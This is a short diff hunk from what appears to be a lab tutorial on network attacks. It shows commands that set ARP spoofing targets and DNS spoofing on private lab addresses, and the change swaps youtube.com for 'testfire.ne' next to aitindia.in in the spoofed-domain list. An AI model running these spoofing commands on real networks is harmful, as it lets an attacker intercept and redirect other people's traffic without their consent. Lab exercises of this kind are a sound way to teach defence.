@@ -25,7 +25,7 @@ set arp.spoof.targets 192.168.229.132
 ```
 set dns.spoof.address 192.168.229.131
 
-set dns.spoof.domains youtube.com,aitindia.in
+set dns.spoof.domains testfire.ne,aitindia.in
 
 dns.spoof on
 ```
